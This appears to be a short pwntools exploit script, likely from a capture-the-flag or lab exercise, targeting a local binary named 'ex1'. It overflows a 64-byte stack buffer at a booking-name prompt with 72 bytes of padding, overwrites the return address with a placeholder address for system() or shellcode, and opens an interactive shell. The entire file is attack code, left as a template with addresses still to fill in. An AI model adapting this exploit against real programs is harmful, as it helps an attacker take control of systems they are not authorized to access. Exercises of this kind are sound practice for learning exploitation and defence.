from pwn import *

# Load the binary
elf = ELF('./ex1')  # Adjust the path as necessary

# Start the process
io = process(elf.path)

# Address of the function we want to call (we'll use system, execve, or shellcode)
# We assume you have a shellcode or can call a function that leads to a shell.
# Adjust according to your findings.
# If we had a shellcode or a known function, we would set that here.
# For demonstration, we'll use a placeholder address for system()
shell_function_address = 0x7ffff7ddcd70  # Replace with the actual address (system, execve, etc.)

# Create the payload
# We need to fill the buffer, overflow it, and overwrite the return address
padding = b'A' * 72  # Adjust padding based on the buffer size (64 bytes + saved rbp + 8 for return address)
payload = padding + p64(shell_function_address)  # Overwrite return address with shell function address

# Sending the payload
io.sendlineafter(b"Please input your name to check your booking:", payload)

# Interact with the shell
io.interactive()